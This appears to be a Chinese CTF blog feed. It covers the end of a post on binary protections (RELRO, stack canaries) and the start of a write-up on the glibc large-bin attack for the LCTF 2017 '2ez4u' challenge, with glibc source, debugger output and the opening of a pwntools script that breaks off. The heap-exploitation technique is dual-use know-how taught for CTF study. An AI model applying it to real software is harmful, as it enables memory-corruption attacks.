RELRO"></a>重定位只读 RELRO</h2><p>RELRO(RELocation Read-Only, 重定位只读), 此项技术主要针对 GOT 改写的攻击方式。分为部分RELRO(Partial RELRO)与完全 RELRO(Full RELRO) 两种。    </p><ul><li>部分 RELRO: 在程序装入后, 将其中一些段(如.dynamic)标记为只读, 防止程序的一些重定位信息被修改。</li><li>完全 RELRO: 在部分 RELRO 的基础上, 在程序装入时, 直接解析完所有符号并填入对应的值, 此时所有的 GOT 表项都已初始化, 且不装入link_map与_dl_runtime_resolve的地址(二者都是程序动态装载的重要结构和函数)。</li></ul><p>可以看到, 当程序启用完全 RELRO 时,  传统的 GOT 劫持的方式也不再可用。但完全 RELRO 对程序性能的影响也相对较大, 因为其相当于禁用了用于性能优化的动态装载机制, 将程序中可能不会用到的一些动态符号装入, 当程序导入的外部符号很多时, 将带来一定程度的额外开销。</p><p>对于攻击者来说, 劫持程序本身 GOT 的利用方式仅仅是破坏函数指针中的一种, 由于系统库大多没有应用重定位只读技术, 结合之前的信息泄露技术, 劫持其他模块中的 GOT 与其他函数指针也是攻击者的手段之一。</p><h2 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h2><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。<strong>当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。</strong>攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cc -fno-stack-protector -o test test.c  //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6" target="_blank" rel="noopener">http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6</a></p><p><a href="http://jcs.iie.ac.cn/ch/reader/create_pdf.aspx?file_no=20180101&amp;year_id=2018&amp;quarter_id=1&amp;falg=1" target="_blank" rel="noopener">http://jcs.iie.ac.cn/ch/reader/create_pdf.aspx?file_no=20180101&amp;year_id=2018&amp;quarter_id=1&amp;falg=1</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;不可执行位-NX-Bit&quot;&gt;&lt;a href=&quot;#不可执行位-NX-Bit&quot; class=&quot;headerlink&quot; title=&quot;不可执行位 NX Bit&quot;&gt;&lt;/a&gt;不可执行位 NX Bit&lt;/h2&gt;&lt;p&gt;NX(Non-eXecute)位是一种针对 shellcod
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="其他" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E5%85%B6%E4%BB%96/"/>
    
    
  </entry>
  
  <entry>
    <title>large bins attack及lctf2017 2ez4u writeup</title>
    <link href="http://eternalsakura13.com/2018/03/21/lctf2/"/>
    <id>http://eternalsakura13.com/2018/03/21/lctf2/</id>
    <published>2018-03-20T23:42:43.180Z</published>
    <updated>2018-03-25T17:06:01.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="关于fd-nextsize和bk-nextsize"><a href="#关于fd-nextsize和bk-nextsize" class="headerlink" title="关于fd_nextsize和bk_nextsize"></a>关于fd_nextsize和bk_nextsize</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *s=<span class="built_in">malloc</span>(<span class="number">1008</span>);<span class="comment">//分配large bin的大小</span></span><br><span class="line">    <span class="keyword">char</span> *s1=<span class="built_in">malloc</span>(<span class="number">1008</span>);</span><br><span class="line">    <span class="keyword">char</span> *s2=<span class="built_in">malloc</span>(<span class="number">960</span>);</span><br><span class="line">    <span class="keyword">char</span> *s3=<span class="built_in">malloc</span>(<span class="number">960</span>);</span><br><span class="line">    <span class="keyword">char</span> *s4=<span class="built_in">malloc</span>(<span class="number">980</span>);</span><br><span class="line">    <span class="keyword">char</span> *s5=<span class="built_in">malloc</span>(<span class="number">980</span>);</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line">    <span class="built_in">free</span>(s2);</span><br><span class="line">    <span class="built_in">free</span>(s4);</span><br><span class="line">    <span class="keyword">char</span> *s6=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">2000</span>);unsorted bins里找</span><br><span class="line">    s6=<span class="string">"hello,world"</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,s6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译：<code>gcc -m32 fenpei.c -g -o  fenpei</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b <span class="number">14</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x804850a</span>: file fenpei.c, line <span class="number">14.</span></span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/sakura/fenpei </span><br><span class="line">...</span><br><span class="line"><span class="number">14</span>    <span class="keyword">char</span> *s6=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x10</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x18</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x28</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x38</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x804bf80</span> —▸ <span class="number">0x804b7f0</span> —▸ <span class="number">0x804b000</span> ◂— <span class="number">0xf7fbd450</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure></p><p>注意当14行，这条语句运行前，还没有large bins，因为会先把free的chunk加入unsorted bins，然后当再次分配时，遍历unsorted，如果没有才把free的chunk加入到其该去的bins（这里就是large bins)。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br><span class="line"><span class="number">15</span>    s6=<span class="string">"hello,world"</span>;</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x10</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x18</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x28</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x38</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x3c0</span>: <span class="number">0x804b000</span> —▸ <span class="number">0x804bf80</span> —▸ <span class="number">0x804b7f0</span> ◂— <span class="number">0xf7fbd680</span></span><br><span class="line"><span class="number">0x804b000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">1017</span>, </span><br><span class="line">  fd = <span class="number">0x804bf80</span>, </span><br><span class="line">  bk = <span class="number">0xf7fbd680</span> &lt;main_arena+<span class="number">608</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x804bf80</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x804b7f0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">0x804bf80</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">985</span>, </span><br><span class="line">  fd = <span class="number">0x804b7f0</span>, </span><br><span class="line">  bk = <span class="number">0x804b000</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x804b7f0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x804b000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">0x804b7f0</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">969</span>, </span><br><span class="line">  fd = <span class="number">0xf7fbd680</span> &lt;main_arena+<span class="number">608</span>&gt;, </span><br><span class="line">  bk = <span class="number">0x804bf80</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x804b000</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x804bf80</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>结论：</p><ul><li>large bin里的chunk是按照从大到小排序的。</li><li>若chunk在large bin的末端，则其的fd_nextsize指向首部，也就是最大的chunk，否则，fd_nextsize指向的是比它小的chunk.</li><li>若chunk在large bin的首部，则其的bk_nextsize指向末端，也就是最小的chunk，否则,bk_nextsize指向的是比它大的chunk.</li></ul><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-25-162936.jpg" alt=""><br>图中A1、B1、C1大小相同，是同一组chunk，A2是第二组，A3、B3大小相同，是第三组chunk。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;                                            \</span></span><br><span class="line">  FD = P-&gt;fd;                                                          \</span><br><span class="line">  BK = P-&gt;bk;                                                          \</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                \</span><br><span class="line">    malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P); \</span><br><span class="line">  <span class="keyword">else</span> &#123;                                                               \</span><br><span class="line">    FD-&gt;bk = BK;                                                       \</span><br><span class="line">    BK-&gt;fd = FD;                                                       \</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)       \</span><br><span class="line">&amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123; \</span><br><span class="line">      assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);       \</span><br><span class="line">      assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P);       \</span><br><span class="line">      <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;       \</span><br><span class="line"><span class="keyword">if</span> (P-&gt;fd_nextsize == P)       \</span><br><span class="line">  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;       \</span><br><span class="line"><span class="keyword">else</span> &#123;       \</span><br><span class="line">  FD-&gt;fd_nextsize = P-&gt;fd_nextsize;       \</span><br><span class="line">  FD-&gt;bk_nextsize = P-&gt;bk_nextsize;       \</span><br><span class="line">  P-&gt;fd_nextsize-&gt;bk_nextsize = FD;       \</span><br><span class="line">  P-&gt;bk_nextsize-&gt;fd_nextsize = FD;       \</span><br><span class="line">&#125;       \</span><br><span class="line">      &#125;<span class="keyword">else</span> &#123;       \</span><br><span class="line">P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;       \</span><br><span class="line">P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;       \</span><br><span class="line">      &#125;       \</span><br><span class="line">    &#125;       \</span><br><span class="line">  &#125;                                                                    \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>large bins中的空闲chunk可能处于两个双向循环链表中，unlink时需要从两个链表中都删除，这里只分析large bin特有的删除操作，其他的参考我的<a href="http://eternalsakura13.com/2018/03/01/unlink1/">另一篇文章</a></p><ul><li>if (!in_smallbin_range (P-&gt;size)                       \<br>  &amp;&amp; <strong>builtin_expect (P-&gt;fd_nextsize != NULL, 0)) </strong>builtin_expect((x),0)表示 x 的值为假的可能性更大，这是一个用于分值预测的命令，我们只要看里面的P-&gt;fd_nextsize != NULL即可。<br>只有当chunk为large bin且P-&gt;fd_nextsize != NULL 时才需要修改,即chunk是同组的第一个空闲chunk。</li><li>assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);               \<br> assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P);<br> 这里进行两个检查。</li><li>根据具体情况适当设置fd_nextsize和bk_nextsize</li></ul><p>第一种：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">else</span> &#123;       \</span><br><span class="line">P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;       \</span><br><span class="line">P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;       \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>即如果FD-&gt;fd_nextsize != NULL，说明FD是下一组尺寸相同的chunks的第一个chunk。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-25-163704.jpg" alt=""><br>图示我要移除的P为A2，则FD是A3，FD的fd_nextsize!=NULL</p><p>P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-25-163854.jpg" alt=""><br>P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-25-164010.jpg" alt=""><br>第二种：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;       \</span><br><span class="line"><span class="keyword">if</span> (P-&gt;fd_nextsize == P)       \</span><br><span class="line">  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;</span><br></pre></td></tr></table></figure></p><p>如果FD-&gt;fd_nextsize == NULL，且P是仅有的唯一一组尺寸相同的 chunks的第一个chunk。</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-21-021545.jpg" alt=""><br>图示的chunk大小都相同，若P为A1，FD即B1。<br>则此时P-&gt;fd_nextsize仍为P，移除P后，FD就是第一个chunk，所以将FD的fd_nextsize和bk_nextsize都由NULL修改为指向它自己。</p><p>第三种：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)       \</span><br><span class="line">&amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123; \</span><br><span class="line">      ...       \</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;       \</span><br><span class="line">  FD-&gt;fd_nextsize = P-&gt;fd_nextsize;       \</span><br><span class="line">  FD-&gt;bk_nextsize = P-&gt;bk_nextsize;       \</span><br><span class="line">  P-&gt;fd_nextsize-&gt;bk_nextsize = FD;       \</span><br><span class="line">  P-&gt;bk_nextsize-&gt;fd_nextsize = FD;       \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>有多组chunks,且P为同组chunks的第一个chunk，且FD不是下一组尺寸相同的chunks的第一个chunk。</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-25-164526.jpg" alt=""><br>图示要移除的P为A2，则FD为B2。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">FD-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br></pre></td></tr></table></figure></p><p><strong>FD继承P的fd_nextsize和bk_nextsize</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-25-164943.jpg" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      </span><br><span class="line">P-&gt;bk_nextsize-&gt;fd_nextsize = FD;</span><br></pre></td></tr></table></figure></p><p><strong>修改P-&gt;fd_nextsize和P-&gt;bk_nextsize的指针</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-25-165417.jpg" alt=""></p><h3 id="large-bin的分配"><a href="#large-bin的分配" class="headerlink" title="large bin的分配"></a>large bin的分配</h3><p>下述内容来源《glibc内存管理ptmalloc源代码分析》p87及glibc2.12.1源码</p><p>这里略去之前fastbins的合并和对unsorted的检索。<br>当这些都不能分配合适的chunk的时候，就到了下面的large bin分配实现。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">      sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;</span><br><span class="line">      bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 如果所需分配的chunk为large bin chunk，查询对应的large bin链表，</span></span><br><span class="line"><span class="comment">      如果large bin链表为空，或者链表中最大的chunk(即first(bin)，large bin中的第一个chunk)也不能满足要求，</span></span><br><span class="line"><span class="comment">      则不能从large bin中分配。否则，遍历large bin 链表，找到合适的chunk。 */</span></span><br><span class="line">      <span class="keyword">if</span> ((victim = first(bin)) != bin &amp;&amp;</span><br><span class="line">  (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb)) &#123;</span><br><span class="line">      <span class="comment">/*反向遍历chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环。*/</span></span><br><span class="line">victim = victim-&gt;bk_nextsize;<span class="comment">//第一个chunk的bk_nextsize是large bins的末端，即最小的chunk</span></span><br><span class="line"><span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size = chunksize(victim)) &lt;</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb)))</span><br><span class="line">  victim = victim-&gt;bk_nextsize;<span class="comment">//遍历chunk_size链表，找下一个更大的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 如果从large bin链表中选取的chunk victim不是链表中的最后一个chunk，</span></span><br><span class="line"><span class="comment">    并且与victim 大小相同的chunk不止一个，那么意味着victim为chunk size链表中的节点，</span></span><br><span class="line"><span class="comment">    为了不调整chunk size链表，需要避免将chunk size链表中的节点取出，所以取victim-&gt;fd节点对应的chunk作为候选chunk。</span></span><br><span class="line"><span class="comment">    由于large bin链表中的 chunk也是按大小排序，同一大小的chunk有多个时，这些chunk必定排在一起，</span></span><br><span class="line"><span class="comment">    所以victim-&gt;fd节点对应的chunk的大小必定与victim的大小一样。 */</span></span><br><span class="line"><span class="keyword">if</span> (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">  victim = victim-&gt;fd;</span><br><span class="line">    <span class="comment">/*计算将victim切分后剩余大小，并调用unlink()宏函数将victim从large bin链表中取出。*/</span></span><br><span class="line">remainder_size = size - nb;</span><br><span class="line">unlink(victim, bck, fwd);</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* 调用chunk2mem()获得chunk中可用的内存指针，返回给应用层，退出 */</span></span><br><span class="line">check_malloced_chunk(av, victim, nb);</span><br><span class="line"><span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">  alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>关于堆利用的其他知识,可以参考<a href="http://jcs.iie.ac.cn/ch/reader/view_abstract.aspx?file_no=20180101&amp;flag=1" target="_blank" rel="noopener">清华的论文</a>和<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/heap_overview/" target="_blank" rel="noopener">CTF-wiki</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ checksec 2ez4u </span><br><span class="line">[*] &apos;/home/sakura/2ez4u&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h4 id="去掉alarm"><a href="#去掉alarm" class="headerlink" title="去掉alarm"></a>去掉alarm</h4><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-21-154234.png" alt="">去掉之后，注意多nop几下……别让函数看上去断了，弄成我下面这样就行。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-21-145746.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-21-150913.png" alt=""></p><h3 id="分析结构体"><a href="#分析结构体" class="headerlink" title="分析结构体"></a>分析结构体</h3><p>个人习惯先逆向分析一下结构体。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-083727.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-083809.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-084037.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-083858.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-083930.png" alt=""><br>简单在注释里写了一下分析。</p><p>结论是：</p><ol><li>apple结构体<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-092203.jpg" alt=""></li><li>管理apple的数据结构<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-093047.jpg" alt=""><h3 id="使用pwntools动态分析"><a href="#使用pwntools动态分析" class="headerlink" title="使用pwntools动态分析"></a>使用pwntools动态分析</h3>动态分析时使用的脚本如下<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'x86-64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">io = process(<span class="string">"./2ez4u"</span>, env = &#123;<span class="string">"LD_PRELOAD"</span> : <span class="string">"./libc.so"</span>&#125;)</span><br><span class="line">base_addr=<span class="number">0x555555554000</span></span><br><span class="line">gdb.attach(io, <span class="string">'b *0x%x'</span> % (base_addr+<span class="number">0xD22</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(value, num, l, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span 